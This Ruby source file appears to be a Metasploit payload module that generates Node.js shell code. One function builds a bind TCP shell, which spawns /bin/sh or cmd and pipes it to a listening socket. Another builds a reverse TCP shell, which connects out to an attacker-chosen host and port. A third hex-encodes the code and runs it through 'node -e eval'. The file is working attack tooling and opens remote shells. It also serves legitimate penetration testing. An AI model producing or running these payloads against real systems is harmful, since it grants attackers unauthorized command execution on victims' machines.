# -*- coding: binary -*-
require 'msf/core'

module Msf::Payload::NodeJS
  # Outputs a javascript snippet that spawns a bind TCP shell
  # @return [String] javascript code that executes bind TCP payload
  def nodejs_bind_tcp
    cmd = <<-EOS
      (function(){
        var require = global.require || global.process.mainModule.constructor._load;
        if (!require) return;

        var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
        var net = require("net"),
            cp = require("child_process"),
            util = require("util");

        var server = net.createServer(function(socket) {  
          var sh = cp.spawn(cmd, []);
          socket.pipe(sh.stdin);
          util.pump(sh.stdout, socket);
          util.pump(sh.stderr, socket);
        });
        server.listen(#{datastore['LPORT']});
      })();
    EOS
    cmd.gsub("\n",'').gsub(/\s+/,' ').gsub(/[']/, '\\\\\'')
  end

  # Outputs a javascript snippet that spawns a reverse TCP shell
  # @return [String] javascript code that executes reverse TCP payload
  def nodejs_reverse_tcp
    lhost = Rex::Socket.is_ipv6?(lhost) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
    cmd = <<-EOS
      (function(){
        var require = global.require || global.process.mainModule.constructor._load;
        if (!require) return;
        var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
        var net = require("net"),
            cp = require("child_process"),
            util = require("util"),
            sh = cp.spawn(cmd, []);
        var client = this;
        client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", function() {
          client.socket.pipe(sh.stdin);
          util.pump(sh.stdout, client.socket);
          util.pump(sh.stderr, client.socket);
        });
      })();
    EOS
    cmd.gsub("\n",'').gsub(/\s+/,' ').gsub(/[']/, '\\\\\'')
  end

  # Wraps the javascript code param in a "node" command invocation
  # @param [String] code the javascript code to run
  # @return [String] a command that invokes "node" and passes the code
  def nodejs_cmd(code)
    "node -e 'eval(\"#{Rex::Text.to_hex(code, "\\x")}\");'"
  end
end
